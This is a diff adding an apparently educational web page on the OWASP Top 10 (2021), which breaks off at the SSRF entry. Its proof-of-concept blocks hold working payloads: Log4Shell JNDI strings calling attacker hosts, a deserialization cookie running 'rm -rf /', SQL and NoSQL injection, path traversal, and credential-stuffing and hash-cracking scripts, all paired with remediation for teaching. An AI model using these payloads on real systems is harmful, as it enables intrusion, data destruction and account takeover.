@@ -1,0 +1,890 @@
+<%- include('partials/header') %>
+
+<section class="hero fade-in">
+  <span class="hero__badge">Module 02</span>
+  <h1 class="hero__title">OWASP Top 10 (2021)</h1>
+  <p class="hero__subtitle">Complete breakdown of all 10 critical web application security risks with explanations, real examples, exploit POCs, and remediation strategies.</p>
+</section>
+
+<div class="container fade-in">
+
+  <div class="accordion" id="owasp-accordion">
+
+    <!-- A01 -->
+    <div class="accordion__item active">
+      <div class="accordion__header">
+        <span class="accordion__id">A01:2021</span>
+        <h3 class="accordion__title">Broken Access Control</h3>
+        <span class="accordion__arrow">▼</span>
+      </div>
+      <div class="accordion__body">
+        <div class="accordion__content">
+          <div class="info-box info-box--explain">
+            <div class="info-box__title">📘 A. Explanation</div>
+            <div class="info-box__content">
+              <p>Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of all data, or performing a business function outside the user's limits. Moved up from #5 in 2017 to <strong>#1 in 2021</strong> — the most critical web vulnerability.</p>
+              <p>Common weaknesses include:</p>
+              <ul>
+                <li>Insecure Direct Object References (IDOR) — accessing resources by changing IDs</li>
+                <li>Missing function-level access control — admin pages accessible to regular users</li>
+                <li>Metadata manipulation — tampering with JWT tokens, cookies, or hidden fields</li>
+                <li>CORS misconfiguration — allowing access from unauthorized origins</li>
+                <li>Force browsing — accessing pages not linked in the UI</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="info-box info-box--example">
+            <div class="info-box__title">🟣 B. Real-World Example</div>
+            <div class="info-box__content">
+              <p><strong>Scenario 1 — IDOR:</strong> A banking application uses the account number in the URL: <code>/account?id=12345</code>. An attacker modifies the ID to <code>/account?id=12346</code> and accesses another customer's financial data.</p>
+              <p><strong>Scenario 2 — Privilege Escalation:</strong> A regular user discovers the admin panel at <code>/admin/dashboard</code> and can access it because the server only checks if the user is authenticated (logged in) but not authorized (admin role).</p>
+              <p><strong>Real Case:</strong> In 2019, First American Financial exposed 885 million records due to an IDOR vulnerability where sequential document IDs were publicly accessible.</p>
+            </div>
+          </div>
+
+          <div class="info-box info-box--exploit">
+            <div class="info-box__title">🔴 C. How the Exploit Happens (POC)</div>
+            <div class="info-box__content">
+              <div class="code-block">
+                <div class="code-block__header">
+                  <span class="code-block__lang">HTTP — IDOR Attack</span>
+                  <button class="code-block__copy">Copy</button>
+                </div>
+                <pre><code># Step 1: Attacker logs in as user123 and sees their own profile
+GET /api/users/123/profile HTTP/1.1
+Authorization: Bearer eyJhbGci...user123_token...
+→ 200 OK: {"name":"User123","email":"user123@email.com","ssn":"123-45-6789"}
+
+# Step 2: Attacker changes the user ID in the URL
+GET /api/users/456/profile HTTP/1.1
+Authorization: Bearer eyJhbGci...user123_token...
+→ 200 OK: {"name":"Admin","email":"admin@company.com","ssn":"987-65-4321"}
+# 💀 Server only checked authentication, not authorization!
+
+# Step 3: Attacker enumerates all users
+for id in range(1, 10000):
+    GET /api/users/{id}/profile
+    → Harvests personal data of every user</code></pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="info-box info-box--remediation">
+            <div class="info-box__title">✅ D. Remediation</div>
+            <div class="info-box__content">
+              <ul>
+                <li><strong>Deny by default</strong> — resources should be non-public by default</li>
+                <li>Implement server-side access control checks on every request</li>
+                <li>Use Role-Based Access Control (RBAC) or Attribute-Based Access Control (ABAC)</li>
+                <li>Validate that the authenticated user owns the requested resource</li>
+                <li>Use UUIDs instead of sequential IDs to make IDOR harder</li>
+                <li>Log access control failures and alert on anomalies</li>
+                <li>Disable directory listing on web servers</li>
+                <li>Rate limit API requests to prevent enumeration</li>
+              </ul>
+              <div class="code-block">
+                <div class="code-block__header">
+                  <span class="code-block__lang">JavaScript — Proper Authorization</span>
+                  <button class="code-block__copy">Copy</button>
+                </div>
+                <pre><code>// ✅ SECURE: Check resource ownership
+app.get('/api/users/:id/profile', authenticate, (req, res) => {
+  if (req.user.sub !== req.params.id && req.user.role !== 'admin') {
+    return res.status(403).json({ error: 'Access denied' });
+  }
+  // ... return profile data
+});</code></pre>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- A02 -->
+    <div class="accordion__item">
+      <div class="accordion__header">
+        <span class="accordion__id">A02:2021</span>
+        <h3 class="accordion__title">Cryptographic Failures</h3>
+        <span class="accordion__arrow">▼</span>
+      </div>
+      <div class="accordion__body">
+        <div class="accordion__content">
+          <div class="info-box info-box--explain">
+            <div class="info-box__title">📘 A. Explanation</div>
+            <div class="info-box__content">
+              <p>Previously known as "Sensitive Data Exposure," this category focuses on failures related to cryptography that often lead to data breaches. This includes transmitting data in cleartext, using weak/deprecated crypto algorithms, weak key generation, missing encryption at rest, and improper certificate validation.</p>
+              <ul>
+                <li>Using MD5 or SHA1 for password hashing (fast = bad for passwords)</li>
+                <li>Storing passwords in plaintext or reversible encryption</li>
+                <li>Using HTTP instead of HTTPS for sensitive data</li>
+                <li>Hardcoding encryption keys in source code</li>
+                <li>Not enforcing TLS 1.2+ or using weak cipher suites</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="info-box info-box--example">
+            <div class="info-box__title">🟣 B. Real-World Example</div>
+            <div class="info-box__content">
+              <p><strong>LinkedIn Breach (2012):</strong> 6.5 million unsalted SHA-1 password hashes were leaked. Attackers cracked most of them within hours using rainbow tables and GPU clusters.</p>
+              <p><strong>Adobe Breach (2013):</strong> 153 million user records exposed with passwords encrypted using 3DES-ECB (not hashed). The ECB mode meant identical passwords produced identical ciphertexts, making pattern analysis trivial.</p>
+            </div>
+          </div>
+
+          <div class="info-box info-box--exploit">
+            <div class="info-box__title">🔴 C. How the Exploit Happens (POC)</div>
+            <div class="info-box__content">
+              <div class="code-block">
+                <div class="code-block__header">
+                  <span class="code-block__lang">SQL + Hashcat</span>
+                  <button class="code-block__copy">Copy</button>
+                </div>
+                <pre><code># Step 1: Attacker obtains the user database (via SQLi or backup leak)
+SELECT username, password_hash FROM users;
+→ admin    : 5f4dcc3b5aa765d61d8327deb882cf99
+→ john     : e99a18c428cb38d5f260853678922e03
+
+# Step 2: Identify hash type (MD5 — 32 hex chars, no salt)
+hash-identifier 5f4dcc3b5aa765d61d8327deb882cf99
+→ "MD5"
+
+# Step 3: Crack with hashcat
+hashcat -m 0 -a 0 hashes.txt rockyou.txt
+→ 5f4dcc3b5aa765d61d8327deb882cf99 : password
+→ e99a18c428cb38d5f260853678922e03 : abc123
+
+# Cracked in under 1 second! 💀</code></pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="info-box info-box--remediation">
+            <div class="info-box__title">✅ D. Remediation</div>
+            <div class="info-box__content">
+              <ul>
+                <li>Use <strong>bcrypt</strong>, <strong>Argon2</strong>, or <strong>scrypt</strong> for password hashing (not MD5/SHA)</li>
+                <li>Enforce <strong>TLS 1.2+</strong> with strong cipher suites and HSTS</li>
+                <li>Use <strong>AES-256-GCM</strong> for data encryption at rest</li>
+                <li>Never store sensitive data unnecessarily — minimize data retention</li>
+                <li>Generate keys using cryptographically secure random generators</li>
+                <li>Rotate encryption keys and secrets periodically</li>
+                <li>Don't commit secrets to version control — use environment variables</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- A03 -->
+    <div class="accordion__item">
+      <div class="accordion__header">
+        <span class="accordion__id">A03:2021</span>
+        <h3 class="accordion__title">Injection</h3>
+        <span class="accordion__arrow">▼</span>
+      </div>
+      <div class="accordion__body">
+        <div class="accordion__content">
+          <div class="info-box info-box--explain">
+            <div class="info-box__title">📘 A. Explanation</div>
+            <div class="info-box__content">
+              <p>Injection flaws occur when an attacker can send hostile data to an interpreter as part of a command or query. Common types include SQL injection, NoSQL injection, OS command injection, LDAP injection, and XSS (now merged into this category). The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.</p>
+              <ul>
+                <li><strong>SQL Injection</strong> — manipulating database queries</li>
+                <li><strong>NoSQL Injection</strong> — exploiting MongoDB/CouchDB queries</li>
+                <li><strong>OS Command Injection</strong> — executing system commands</li>
+                <li><strong>LDAP Injection</strong> — manipulating directory queries</li>
+                <li><strong>XSS (Cross-Site Scripting)</strong> — injecting client-side scripts</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="info-box info-box--example">
+            <div class="info-box__title">🟣 B. Real-World Example</div>
+            <div class="info-box__content">
+              <p><strong>Heartland Payment Systems (2008):</strong> SQL injection attack led to theft of 130 million credit/debit card numbers — one of the largest data breaches in history. Attacker Albert Gonzalez embedded SQL injection payloads that extracted card data over months.</p>
+              <p><strong>Sony Pictures (2011):</strong> LulzSec used SQL injection to steal 77 million PlayStation Network accounts, storing plaintext passwords.</p>
+            </div>
+          </div>
+
+          <div class="info-box info-box--exploit">
+            <div class="info-box__title">🔴 C. How the Exploit Happens (POC)</div>
+            <div class="info-box__content">
+              <div class="code-block">
+                <div class="code-block__header">
+                  <span class="code-block__lang">SQL Injection — Authentication Bypass</span>
+                  <button class="code-block__copy">Copy</button>
+                </div>
+                <pre><code># Vulnerable login query (string concatenation):
+query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
+
+# Attacker input:
+# Username: admin'--
+# Password: anything
+
+# Resulting query:
+SELECT * FROM users WHERE username='admin'--' AND password='anything'
+# The -- comments out the rest of the query!
+# Result: Login as admin without knowing the password 💀
+
+# More destructive:
+# Username: '; DROP TABLE users;--
+# This could delete the entire users table!</code></pre>
+              </div>
+              <div class="code-block" style="margin-top:16px;">
+                <div class="code-block__header">
+                  <span class="code-block__lang">NoSQL Injection — MongoDB</span>
+                  <button class="code-block__copy">Copy</button>
+                </div>
+                <pre><code># Vulnerable Express.js code:
+db.users.find({ username: req.body.username, password: req.body.password });
+
+# Attacker sends JSON:
+POST /login
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+
+# MongoDB query becomes: find users where username is NOT empty AND password is NOT empty
+# Returns the first user in the database! (usually admin)</code></pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="info-box info-box--remediation">
+            <div class="info-box__title">✅ D. Remediation</div>
+            <div class="info-box__content">
+              <ul>
+                <li>Use <strong>parameterized queries / prepared statements</strong> (never concatenate user input)</li>
+                <li>Use an ORM (Sequelize, Mongoose) with proper safeguards</li>
+                <li>Input validation: whitelist expected characters, reject unexpected ones</li>
+                <li>Escape special characters for the target interpreter</li>
+                <li>Apply least privilege principle to database accounts</li>
+                <li>Use a Web Application Firewall (WAF) as an additional layer</li>
+                <li>For XSS: Encode output, use CSP headers, sanitize HTML</li>
+              </ul>
+              <div class="code-block">
+                <div class="code-block__header">
+                  <span class="code-block__lang">JavaScript — Parameterized Query</span>
+                  <button class="code-block__copy">Copy</button>
+                </div>
+                <pre><code>// ✅ SECURE: Parameterized query (values are never part of the SQL string)
+const result = await db.query(
+  'SELECT * FROM users WHERE username = $1 AND password_hash = $2',
+  [username, hashedPassword]
+);</code></pre>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- A04 -->
+    <div class="accordion__item">
+      <div class="accordion__header">
+        <span class="accordion__id">A04:2021</span>
+        <h3 class="accordion__title">Insecure Design</h3>
+        <span class="accordion__arrow">▼</span>
+      </div>
+      <div class="accordion__body">
+        <div class="accordion__content">
+          <div class="info-box info-box--explain">
+            <div class="info-box__title">📘 A. Explanation</div>
+            <div class="info-box__content">
+              <p><strong>New in 2021.</strong> Insecure design represents weaknesses in the design and architecture of an application. Unlike implementation bugs (which can be fixed with code), insecure design flaws cannot be fixed by a perfect implementation. They require re-engineering the design itself.</p>
+              <ul>
+                <li>Missing or insufficient threat modeling during design</li>
+                <li>Lack of security design patterns and best practices</li>
+                <li>No rate limiting on sensitive operations</li>
+                <li>Relying on security questions for account recovery (answers often public)</li>
+                <li>No multi-factor authentication for critical actions</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="info-box info-box--example">
+            <div class="info-box__title">🟣 B. Real-World Example</div>
+            <div class="info-box__content">
+              <p><strong>Scenario:</strong> A cinema website allows bulk booking up to 15 seats. Attackers script bots to book all 600 seats, holding them without payment (no rate limiting, no time-limited holds). This causes massive revenue loss and denies service to legitimate customers.</p>
+              <p><strong>Real Case:</strong> Tesla's Powerwall API had no rate limiting on firmware update requests. Researchers discovered they could trigger unlimited firmware downloads, demonstrating a design flaw that could cause denial of service.</p>
+            </div>
+          </div>
+
+          <div class="info-box info-box--exploit">
+            <div class="info-box__title">🔴 C. How the Exploit Happens (POC)</div>
+            <div class="info-box__content">
+              <div class="code-block">
+                <div class="code-block__header">
+                  <span class="code-block__lang">Python — Credential Stuffing via Security Questions</span>
+                  <button class="code-block__copy">Copy</button>
+                </div>
+                <pre><code># Account recovery uses questions with answers findable on social media
+import requests
+
+target = "https://vulnerable-app.com/recover"
+
+# Information gathered from victim's Facebook, Instagram, LinkedIn
+answers = {
+    "pet_name": "Buddy",       # From Instagram pet photos
+    "maiden_name": "Smith",     # From Facebook family info
+    "first_car": "Honda Civic"  # From nostalgic post
+}
+
+response = requests.post(target, data={
+    "email": "victim@email.com",
+    "question1": answers["pet_name"],
+    "question2": answers["maiden_name"],
+    "question3": answers["first_car"]
+})
+
+# → 200 OK: Password reset link sent!
+# Attacker takes over account using publicly available information 💀</code></pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="info-box info-box--remediation">
+            <div class="info-box__title">✅ D. Remediation</div>
+            <div class="info-box__content">
+              <ul>
+                <li>Use <strong>threat modeling</strong> during the design phase (STRIDE, PASTA)</li>
+                <li>Establish a <strong>Secure Development Lifecycle (SDLC)</strong></li>
+                <li>Implement rate limiting and quotas for all operations</li>
+                <li>Use time-limited resource holds with automatic release</li>
+                <li>Replace security questions with TOTP/WebAuthn for account recovery</li>
+                <li>Write integration tests for critical access control scenarios</li>
+                <li>Limit resource consumption by user/service tier</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- A05 -->
+    <div class="accordion__item">
+      <div class="accordion__header">
+        <span class="accordion__id">A05:2021</span>
+        <h3 class="accordion__title">Security Misconfiguration</h3>
+        <span class="accordion__arrow">▼</span>
+      </div>
+      <div class="accordion__body">
+        <div class="accordion__content">
+          <div class="info-box info-box--explain">
+            <div class="info-box__title">📘 A. Explanation</div>
+            <div class="info-box__content">
+              <p>Security misconfiguration is the most commonly seen vulnerability. It occurs when security settings are defined, implemented, or maintained improperly. This includes using default configurations, leaving unnecessary features enabled, misconfigured permissions, and exposing detailed error information.</p>
+              <ul>
+                <li>Default admin credentials still active (<code>admin:admin</code>)</li>
+                <li>Directory listing enabled on web servers</li>
+                <li>Stack traces / verbose error messages in production</li>
+                <li>Unnecessary services, ports, or features enabled</li>
+                <li>Missing security headers (HSTS, CSP, X-Frame-Options)</li>
+                <li>Misconfigured cloud storage (S3 buckets publicly accessible)</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="info-box info-box--example">
+            <div class="info-box__title">🟣 B. Real-World Example</div>
+            <div class="info-box__content">
+              <p><strong>Capital One (2019):</strong> A misconfigured WAF (Web Application Firewall) allowed an attacker to perform SSRF and access AWS metadata, leading to the theft of 100+ million credit card applications. The root cause was an IAM role with excessive permissions assigned to the WAF.</p>
+              <p><strong>Microsoft Azure (2021):</strong> Cosmos DB instances had Jupyter Notebook enabled by default, and the access management key was exposed, allowing full read/write access to databases.</p>
+            </div>
+          </div>
+
+          <div class="info-box info-box--exploit">
+            <div class="info-box__title">🔴 C. How the Exploit Happens (POC)</div>
+            <div class="info-box__content">
+              <div class="code-block">
+                <div class="code-block__header">
+                  <span class="code-block__lang">HTTP — Exploiting Misconfigurations</span>
+                  <button class="code-block__copy">Copy</button>
+                </div>
+                <pre><code># 1. Default credentials
+POST /admin/login
+{"username":"admin","password":"admin"}
+→ 200 OK: Welcome, Administrator! 💀
+
+# 2. Directory listing reveals sensitive files
+GET /backup/ HTTP/1.1
+→ Index of /backup/
+  database_2024.sql   (850MB)
+  .env                (contains API keys!)
+  id_rsa              (private SSH key!)
+
+# 3. Verbose error reveals internal structure
+GET /api/users/../../etc/passwd HTTP/1.1
+→ 500 Error at /var/www/app/node_modules/express/lib/router/index.js:321
+  Stack: TypeError: Cannot read property 'id' of undefined
+  → Attacker now knows: Node.js, Express framework, file structure
+
+# 4. Publicly accessible S3 bucket
+aws s3 ls s3://company-internal-backups/ --no-sign-request
+→ 2024-01-01 backup.tar.gz  (contains customer data)</code></pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="info-box info-box--remediation">
+            <div class="info-box__title">✅ D. Remediation</div>
+            <div class="info-box__content">
+              <ul>
+                <li>Create an automated <strong>hardening process</strong> for all environments</li>
+                <li>Remove or disable <strong>unnecessary features</strong>, frameworks, and services</li>
+                <li>Change <strong>default credentials</strong> immediately upon deployment</li>
+                <li>Disable <strong>directory listing</strong> and detailed error messages in production</li>
+                <li>Set security headers: <code>Content-Security-Policy</code>, <code>Strict-Transport-Security</code>, <code>X-Frame-Options</code></li>
+                <li>Implement <strong>Infrastructure as Code</strong> (Terraform, CloudFormation) for consistent configs</li>
+                <li>Regularly <strong>audit and review</strong> configurations across all layers</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- A06 -->
+    <div class="accordion__item">
+      <div class="accordion__header">
+        <span class="accordion__id">A06:2021</span>
+        <h3 class="accordion__title">Vulnerable and Outdated Components</h3>
+        <span class="accordion__arrow">▼</span>
+      </div>
+      <div class="accordion__body">
+        <div class="accordion__content">
+          <div class="info-box info-box--explain">
+            <div class="info-box__title">📘 A. Explanation</div>
+            <div class="info-box__content">
+              <p>Applications are vulnerable when they use components (libraries, frameworks, software modules) with known vulnerabilities. This includes not knowing what component versions are in use, using unsupported or end-of-life software, and not regularly scanning for CVEs.</p>
+              <ul>
+                <li>Using npm packages with known CVEs</li>
+                <li>Not updating frameworks (Express, Django, Spring)</li>
+                <li>Running outdated OS or server software (Apache, Nginx)</li>
+                <li>No Software Composition Analysis (SCA) in CI/CD</li>
+                <li>Ignoring <code>npm audit</code> / <code>pip audit</code> warnings</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="info-box info-box--example">
+            <div class="info-box__title">🟣 B. Real-World Example</div>
+            <div class="info-box__content">
+              <p><strong>Equifax (2017):</strong> Failure to patch Apache Struts CVE-2017-5638 led to the breach of 147 million Americans' data. The patch was available 2 months before the breach — Equifax simply didn't update.</p>
+              <p><strong>Log4Shell (2021):</strong> CVE-2021-44228 in Log4j affected millions of Java applications. A single log message containing <code>${jndi:ldap://evil.com/a}</code> could achieve remote code execution.</p>
+            </div>
+          </div>
+
+          <div class="info-box info-box--exploit">
+            <div class="info-box__title">🔴 C. How the Exploit Happens (POC)</div>
+            <div class="info-box__content">
+              <div class="code-block">
+                <div class="code-block__header">
+                  <span class="code-block__lang">Log4Shell RCE</span>
+                  <button class="code-block__copy">Copy</button>
+                </div>
+                <pre><code># Log4Shell (CVE-2021-44228) exploit:
+# Any user input that gets logged with Log4j triggers RCE
+
+# Step 1: Attacker sends crafted User-Agent header
+GET / HTTP/1.1
+User-Agent: ${jndi:ldap://attacker.com/exploit}
+
+# Step 2: Vulnerable server logs the request
+logger.info("User-Agent: " + request.getHeader("User-Agent"));
+
+# Step 3: Log4j processes the JNDI lookup
+→ Connects to attacker's LDAP server
+→ Downloads and executes attacker's Java class
+→ Full Remote Code Execution! 💀
+
+# Impact: Affected Apache, VMware, AWS, Apple iCloud, Minecraft, and thousands more</code></pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="info-box info-box--remediation">
+            <div class="info-box__title">✅ D. Remediation</div>
+            <div class="info-box__content">
+              <ul>
+                <li>Maintain a <strong>Software Bill of Materials (SBOM)</strong> — know every component and version</li>
+                <li>Run <code>npm audit</code>, <code>snyk test</code>, or <code>OWASP Dependency-Check</code> in CI/CD</li>
+                <li>Subscribe to <strong>CVE notifications</strong> for all frameworks in use</li>
+                <li>Remove unused dependencies: <code>npx depcheck</code></li>
+                <li>Only install components from <strong>official, trusted sources</strong></li>
+                <li>Set up <strong>automated dependency updates</strong> (Dependabot, Renovate)</li>
+                <li>Have a patch management policy: <strong>&lt;48 hours for critical CVEs</strong></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- A07 -->
+    <div class="accordion__item">
+      <div class="accordion__header">
+        <span class="accordion__id">A07:2021</span>
+        <h3 class="accordion__title">Identification and Authentication Failures</h3>
+        <span class="accordion__arrow">▼</span>
+      </div>
+      <div class="accordion__body">
+        <div class="accordion__content">
+          <div class="info-box info-box--explain">
+            <div class="info-box__title">📘 A. Explanation</div>
+            <div class="info-box__content">
+              <p>Confirmation of the user's identity, authentication, and session management is critical to protect against authentication-related attacks. Weaknesses include permitting credential stuffing, brute force, weak passwords, session fixation, and missing multi-factor authentication.</p>
+              <ul>
+                <li>No rate limiting on login attempts</li>
+                <li>Accepting weak passwords (<code>123456</code>, <code>password</code>)</li>
+                <li>Credential stuffing from leaked databases</li>
+                <li>Session IDs exposed in URLs</li>
+                <li>Not invalidating sessions on logout/password change</li>
+                <li>Missing MFA for privileged actions</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="info-box info-box--example">
+            <div class="info-box__title">🟣 B. Real-World Example</div>
+            <div class="info-box__content">
+              <p><strong>Collection #1-5 (2019):</strong> 2.2 billion unique username/password pairs were leaked. Attackers use these lists to perform credential stuffing attacks against other services, exploiting password reuse.</p>
+              <p><strong>Zoom (2020):</strong> 500,000 Zoom accounts were sold on the dark web, compromised through credential stuffing using passwords from older data breaches.</p>
+            </div>
+          </div>
+
+          <div class="info-box info-box--exploit">
+            <div class="info-box__title">🔴 C. How the Exploit Happens (POC)</div>
+            <div class="info-box__content">
+              <div class="code-block">
+                <div class="code-block__header">
+                  <span class="code-block__lang">Python — Credential Stuffing</span>
+                  <button class="code-block__copy">Copy</button>
+                </div>
+                <pre><code>import requests
+
+# Attacker has a leaked credential list from a previous breach
+leaked_creds = [
+    ("john@email.com", "password123"),
+    ("jane@email.com", "qwerty2020"),
+    ("admin@corp.com", "Winter2024!"),
+    # ... millions more
+]
+
+target = "https://vulnerable-app.com/api/login"
+
+for email, password in leaked_creds:
+    response = requests.post(target, json={
+        "email": email,
+        "password": password
+    })
+    if response.status_code == 200:
+        print(f"✅ VALID: {email}:{password}")
+        # → No rate limiting, no CAPTCHA, no account lockout!
+        # → Attacker gains access to hundreds of accounts 💀</code></pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="info-box info-box--remediation">
+            <div class="info-box__title">✅ D. Remediation</div>
+            <div class="info-box__content">
+              <ul>
+                <li>Implement <strong>Multi-Factor Authentication (MFA)</strong> for all users</li>
+                <li><strong>Rate limiting</strong>: max 5 failed attempts per 15 minutes, then lockout/CAPTCHA</li>
+                <li>Check passwords against <strong>breach databases</strong> (HaveIBeenPwned API)</li>
+                <li>Enforce minimum password complexity (12+ chars, no common passwords)</li>
+                <li>Regenerate <strong>session IDs</strong> after login</li>
+                <li>Implement proper <strong>JWT expiration</strong> and refresh token rotation</li>
+                <li>Use <strong>bcrypt/Argon2</strong> for password storage</li>
+                <li>Log and monitor all authentication failures</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- A08 -->
+    <div class="accordion__item">
+      <div class="accordion__header">
+        <span class="accordion__id">A08:2021</span>
+        <h3 class="accordion__title">Software and Data Integrity Failures</h3>
+        <span class="accordion__arrow">▼</span>
+      </div>
+      <div class="accordion__body">
+        <div class="accordion__content">
+          <div class="info-box info-box--explain">
+            <div class="info-box__title">📘 A. Explanation</div>
+            <div class="info-box__content">
+              <p><strong>New in 2021.</strong> This category relates to code and infrastructure that does not protect against integrity violations. Examples include using software from untrusted sources (supply chain attacks), insecure CI/CD pipelines, and auto-update mechanisms without integrity verification. Insecure deserialization (previously A08:2017) is merged here.</p>
+              <ul>
+                <li>Supply chain attacks on npm/PyPI packages</li>
+                <li>CI/CD pipelines without proper access controls</li>
+                <li>Auto-updates without signature verification</li>
+                <li>Insecure deserialization leading to RCE</li>
+                <li>Using CDN scripts without Subresource Integrity (SRI) hashes</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="info-box info-box--example">
+            <div class="info-box__title">🟣 B. Real-World Example</div>
+            <div class="info-box__content">
+              <p><strong>SolarWinds (2020):</strong> Attackers compromised the SolarWinds build system and inserted malware into the Orion platform update. 18,000+ organizations (including US government agencies, Microsoft, FireEye) installed the trojanized update. The most devastating supply chain attack in history.</p>
+              <p><strong>event-stream (2018):</strong> A popular npm package (2M weekly downloads) was hijacked when maintainership was transferred to a malicious actor who added code targeting the Copay cryptocurrency wallet.</p>
+            </div>
+          </div>
+
+          <div class="info-box info-box--exploit">
+            <div class="info-box__title">🔴 C. How the Exploit Happens (POC)</div>
+            <div class="info-box__content">
+              <div class="code-block">
+                <div class="code-block__header">
+                  <span class="code-block__lang">JavaScript — Insecure Deserialization</span>
+                  <button class="code-block__copy">Copy</button>
+                </div>
+                <pre><code>// Vulnerable: using node-serialize with user input
+const serialize = require('node-serialize');
+
+app.post('/api/profile', (req, res) => {
+  const userData = serialize.unserialize(req.cookies.profile);
+  // 💀 Attacker sets cookie to:
+  // {"username":"_$$ND_FUNC$$_function(){require('child_process').exec('rm -rf /')}()"}
+  // → Remote Code Execution!
+});
+
+// CDN without SRI:
+// &lt;script src="https://cdn.example.com/lib.js"&gt;&lt;/script&gt;
+// If CDN is compromised, malicious code runs on all sites using it
+
+// ✅ SECURE with SRI:
+// &lt;script src="https://cdn.example.com/lib.js"
+//   integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
+//   crossorigin="anonymous"&gt;&lt;/script&gt;</code></pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="info-box info-box--remediation">
+            <div class="info-box__title">✅ D. Remediation</div>
+            <div class="info-box__content">
+              <ul>
+                <li>Use <strong>digital signatures</strong> to verify software/data integrity</li>
+                <li>Implement <strong>Subresource Integrity (SRI)</strong> for all CDN resources</li>
+                <li>Run <code>npm audit</code> and <code>snyk test</code> in CI/CD pipeline</li>
+                <li>Use <strong>lockfiles</strong> (<code>package-lock.json</code>) to pin dependency versions</li>
+                <li>Ensure CI/CD has proper <strong>access controls</strong> and audit logging</li>
+                <li>Never deserialize untrusted data — use safe alternatives (JSON.parse)</li>
+                <li>Code review all changes to build and deployment configurations</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- A09 -->
+    <div class="accordion__item">
+      <div class="accordion__header">
+        <span class="accordion__id">A09:2021</span>
+        <h3 class="accordion__title">Security Logging and Monitoring Failures</h3>
+        <span class="accordion__arrow">▼</span>
+      </div>
+      <div class="accordion__body">
+        <div class="accordion__content">
+          <div class="info-box info-box--explain">
+            <div class="info-box__title">📘 A. Explanation</div>
+            <div class="info-box__content">
+              <p>Without logging and monitoring, breaches cannot be detected. Insufficient logging, unclear log messages, logs not monitored or only stored locally, and lack of alerting allow attackers to further attack systems, maintain persistence, pivot to more systems, and tamper, extract, or destroy data.</p>
+              <ul>
+                <li>Login failures not logged or monitored</li>
+                <li>Warnings and errors generating no log entries</li>
+                <li>Logs stored only locally (lost on server compromise)</li>
+                <li>No alerting on suspicious activity patterns</li>
+                <li>No incident response plan in place</li>
+                <li>Average breach detection time: <strong>287 days</strong> (IBM 2021)</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="info-box info-box--example">
+            <div class="info-box__title">🟣 B. Real-World Example</div>
+            <div class="info-box__content">
+              <p><strong>Marriott International (2018):</strong> Attackers had access to Starwood's reservation system for 4 YEARS (2014-2018) before detection, compromising 500 million guest records. The breach went undetected because there was no monitoring for anomalous database queries.</p>
+              <p><strong>Target (2013):</strong> Security tools (FireEye) detected the breach and generated alerts, but the security team ignored them. 40 million credit card numbers were stolen during the holiday season.</p>
+            </div>
+          </div>
+
+          <div class="info-box info-box--exploit">
+            <div class="info-box__title">🔴 C. How the Exploit Happens (POC)</div>
+            <div class="info-box__content">
+              <div class="code-block">
+                <div class="code-block__header">
+                  <span class="code-block__lang">Attack Timeline — Undetected Breach</span>
+                  <button class="code-block__copy">Copy</button>
+                </div>
+                <pre><code># Day 1: Attacker performs credential stuffing
+POST /login × 10,000 attempts → No logging, no alerts
+
+# Day 5: Valid creds found, attacker logs in
+# No anomaly detection for unusual login location/time
+
+# Day 10: Privilege escalation
+# Admin panel accessed → No access control logging
+
+# Day 30: Data exfiltration begins
+SELECT * FROM customers → 100,000 records/day
+# No monitoring of large query results
+
+# Day 60: Attacker sells data on dark web
+# Company finds out from a journalist 💀
+
+# Total detection time: 60+ days
+# With proper monitoring: Could detect in MINUTES</code></pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="info-box info-box--remediation">
+            <div class="info-box__title">✅ D. Remediation</div>
+            <div class="info-box__content">
+              <ul>
+                <li>Log all <strong>authentication failures</strong>, access control denials, and input validation failures</li>
+                <li>Ensure logs contain sufficient <strong>context</strong> (timestamp, user, IP, action, resource)</li>
+                <li>Use <strong>centralized log management</strong> (ELK Stack, Splunk, Datadog)</li>
+                <li>Set up <strong>real-time alerting</strong> for suspicious patterns (multiple failed logins, off-hours access)</li>
+                <li>Implement a <strong>Security Information and Event Management (SIEM)</strong> solution</li>
+                <li>Create and test an <strong>Incident Response Plan</strong> regularly</li>
+                <li>Ensure logs are <strong>tamper-proof</strong> (append-only, separate storage)</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- A10 -->
+    <div class="accordion__item">
+      <div class="accordion__header">
+        <span class="accordion__id">A10:2021</span>
+        <h3 class="accordion__title">Server-Side Request Forgery (SSRF)</h3>
